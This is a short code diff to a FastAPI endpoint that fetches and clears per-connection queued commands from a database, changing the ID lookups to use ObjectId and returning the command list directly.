@@ -113,12 +113,12 @@ async def get_commands(connection_id: str):
         raise HTTPException(status_code=404, detail="Connection not found")
 
     # retrieve the commands from the database
-    commands = connection["commands"]
+    commands = connections.find_one({"_id": ObjectId(connection_id)})["commands"]
 
     # clear the commands from the database
-    connections.update_one({"_id": connection_id}, {"$set": {"commands": []}})
+    connections.update_one({"_id": ObjectId(connection_id)}, {"$set": {"commands": []}})
 
-    return {"commands": commands}
+    return commands
 
 # get a list of all commands for one connection from the database to be displayed in the web interface
 @app.get('/command-list/{connection_id}')
